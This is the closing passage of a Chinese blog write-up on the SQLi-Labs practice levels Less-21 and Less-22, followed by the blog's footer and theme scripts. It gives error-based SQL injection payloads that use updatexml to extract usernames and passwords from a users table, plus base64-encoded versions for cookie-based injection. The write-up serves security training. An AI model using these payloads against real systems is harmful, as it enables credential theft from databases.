+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) and updatexml(1,concat(0x7e,(select group_concat(username,&quot;:&quot;,password) from users),0x7e),1)#</span><br><span class="line"></span><br><span class="line"># base64 加密 #</span><br><span class="line">JykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZ3JvdXBfY29uY2F0KHVzZXJuYW1lLCI6IixwYXNzd29yZCkgZnJvbSB1c2VycyksMHg3ZSksMSkj</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/dff0225fa9fa4a5a8f40b039416f62b1.png" alt="在这里插入图片描述"></p>
+<p>其他语句参考 Less-18。</p>
+
+        <h1 id="Less-22"   >
+          <a href="#Less-22" class="heading-link"><i class="fas fa-link"></i></a><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h1>
+      
+        <h2 id="题解-5"   >
+          <a href="#题解-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解-5" class="headerlink" title="题解"></a>题解</h2>
+      <p>与 Less-21 并没有太大区别。【”】字符型。</p>
+<p>将注入语句 base64 编码后传递即可。</p>
+<p><strong>爆字段内容</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot; and updatexml(1,concat(0x7e,(select group_concat(username,&#x27;:&#x27;,password) from users),0x7e),1)#</span><br><span class="line"></span><br><span class="line"># base64 加密 #</span><br><span class="line">IiBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5hbWUsJzonLHBhc3N3b3JkKSBmcm9tIHVzZXJzKSwweDdlKSwxKSM=</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://raw.githubusercontent.com/Dream-Scribe/MyBlog/main/WriteUp%EF%BC%9ASecurity-Lab/%E3%80%8ASQLi-Labs%E3%80%8B03/assets/36e98446ad2f4705a9bde8ac2f93f1fe.png" alt="在这里插入图片描述"></p>
+<p>其他语句参考 Less-18。</p>
+<hr>
+<p><font color="#CDAD00">
+半烟半雨溪桥畔，渔翁醉着无人唤。
+</font></p>
+<p align="right"><font color="#CDAD00">
+——《菩萨蛮》（宋）黄庭坚
+</font></p>
+
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://example.com">镜坛主</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://example.com/2023/05/06/%E3%80%8ASQLi-Labs%E3%80%8B03.%20Less%2017~22/">http://example.com/2023/05/06/%E3%80%8ASQLi-Labs%E3%80%8B03.%20Less%2017~22/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/05/20/%E3%80%8AKali%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E3%80%8B01.%20%E4%BB%8B%E7%BB%8D/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">《Kali渗透基础》01. 介绍</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/05/03/%E3%80%8ASQLi-Labs%E3%80%8B02.%20Less%205~16/"><span class="paginator-prev__text">《SQLi-Labs》02. Less 5~16</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%B4%A2%E5%BC%95"><span class="toc-text">
+          索引</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-17"><span class="toc-text">
+          Less-17</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-text">
+          题解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-text">
+          方法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-text">
+          方法二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89"><span class="toc-text">
+          方法三</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">
+          总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-18"><span class="toc-text">
+          Less-18</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-1"><span class="toc-text">
+          题解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-text">
+          总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-19"><span class="toc-text">
+          Less-19</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-2"><span class="toc-text">
+          题解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-20"><span class="toc-text">
+          Less-20</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-3"><span class="toc-text">
+          题解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-21"><span class="toc-text">
+          Less-21</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-4"><span class="toc-text">
+          题解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-22"><span class="toc-text">
+          Less-22</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-5"><span class="toc-text">
+          题解</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/notAlone.png" alt="avatar"></div><p class="sidebar-ov-author__text">但愿五湖明月在。</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">6</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">3</div><div class="sidebar-ov-state-item__name">分类</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022~2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>镜坛主</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span></div><div>欢迎来到 —— 镜坛！</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
+  var pjax = new Pjax({"selectors":["head title","#main",".pjax-reload",".header-banner"],"history":true,"scrollTo":false,"scrollRestoration":false,"cacheBust":false,"debug":false,"currentUrlFullReload":false,"timeout":0});
+  // 加载进度条的计时器
+  var loadingTimer = null;
+
+  // 重置页面 Y 方向上的滚动偏移量
+  document.addEventListener('pjax:send', function () {
+    $('.header-nav-menu').removeClass('show');
+    if (CONFIG.pjax && CONFIG.pjax.avoidBanner) {
+      $('html').velocity('scroll', {
+        duration: 500,
+        offset: $('#header').height(),
+        easing: 'easeInOutCubic'
+      });
+    }
+
+    var loadingBarWidth = 20;
+    var MAX_LOADING_WIDTH = 95;
+
+    $('.loading-bar').addClass('loading');
+    $('.loading-bar__progress').css('width', loadingBarWidth + '%');
+    clearInterval(loadingTimer);
+    loadingTimer = setInterval(function () {
+      loadingBarWidth += 3;
+      if (loadingBarWidth > MAX_LOADING_WIDTH) {
+        loadingBarWidth = MAX_LOADING_WIDTH;
+      }
+      $('.loading-bar__progress').css('width', loadingBarWidth + '%');
+    }, 500);
+  }, false);
+
+  window.addEventListener('pjax:complete', function () {
+    clearInterval(loadingTimer);
+    $('.loading-bar__progress').css('width', '100%');
+    $('.loading-bar').removeClass('loading');
+    setTimeout(function () {
+      $('.loading-bar__progress').css('width', '0');
+    }, 400);
+    $('link[rel=prefetch], script[data-pjax-rm]').each(function () {
+      $(this).remove();
+    });
+    $('script[data-pjax], #pjax-reload script').each(function () {
+      $(this).parent().append($(this).remove());
+    });
+
+    if (Stun.utils.pjaxReloadBoot) {
+      Stun.utils.pjaxReloadBoot();
+    }
+    if (Stun.utils.pjaxReloadScroll) {
+      Stun.utils.pjaxReloadScroll();
+    }
+    if (Stun.utils.pjaxReloadSidebar) {
+      Stun.utils.pjaxReloadSidebar();
+    }
+    if (false) {
+      if (Stun.utils.pjaxReloadHeader) {
+        Stun.utils.pjaxReloadHeader();
+      }
+      if (Stun.utils.pjaxReloadScrollIcon) {
+        Stun.utils.pjaxReloadScrollIcon();
+      }
+      if (Stun.utils.pjaxReloadLocalSearch) {
+        Stun.utils.pjaxReloadLocalSearch();
+      }
+    }
+  }, false);
+}, false);</script><div id="pjax-reload"></div><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/web-effect-click.js?v=2.8.0"></script><script src="/js/web-effect-flower.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script></body></html>
